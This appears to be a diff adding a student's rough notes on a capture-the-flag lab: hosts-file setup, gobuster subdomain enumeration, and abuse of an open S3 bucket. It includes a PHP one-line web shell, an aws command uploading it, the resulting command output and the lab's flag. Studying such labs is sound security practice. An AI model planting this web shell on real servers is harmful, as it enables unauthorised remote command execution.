@@ -1,0 +1,101 @@
+
+In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? 
+
+	/etc/hosts file (put the ip and domain in it) 
+	
+	
+	
+	
+	
+	
+	
+	So when we visited the site, we saw a domain name in the contact us email so we will be emurating that 
+	
+	
+	• To put a IP and domain name into the DNS so we can access through browser 
+	
+	echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts  
+	
+	We can also use echo to put texts into new files aswell 
+	
+	
+	Gobuster vhost -w worldfile.txt -u thetoppers.htb --append-domain
+	
+	
+	
+	
+
+	• You can can sub domains from amazon and have a static website on it 
+	
+	
+	
+	Found: s3.thetoppers.htb Status: 404 [Size: 21]
+	Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306
+	
+	
+	
+	
+	This is a Json error: {"status": "running"}
+	
+	
+	
+	• So they have used something called S3 in their sub domain, S3/ S3 Bucket is a cloud based storage service by amazon, which you can use to do backups, media hosting, software delivery and even host static sites
+	
+		○ Files stored in the amazon s3bucket is called S3 objects 
+		
+		https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html
+		
+		
+		
+		○ To use the s3 bucket we need to use their command line utility called awscli 
+		
+		
+			https://docs.cades.ornl.gov/user-contributed-tutorials/aws-tutorials/object-storage/s3-aws-cli/
+			
+			
+			
+		○ If apt install don’t work you can use sudo pip install 
+	
+		
+	
+	
+	• If a website is using a certain technology, like pfp we need to make our remote access backdoor php
+
+
+		○ This being one
+		
+			§ <?php system($_GET["cmd"]); ?>
+			
+			
+			
+		
+		
+		
+		
+		○ This command is used to basically set the endpoint as the subdomain we discovered and then we are cp (copying) the php file into their bucket
+
+			aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+			
+			
+			
+			
+			
+			Then we can try uploading the specific php file containing a php get command to get uid 
+			
+			Once we do we get this: inside of the specific shell.php page that we uploaded 
+			
+			uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+			
+			
+			
+			Then 
+			
+	
+			a980d99281a28d638ac68b9bf9453c2b
+			
+			
+
+
+
+
+
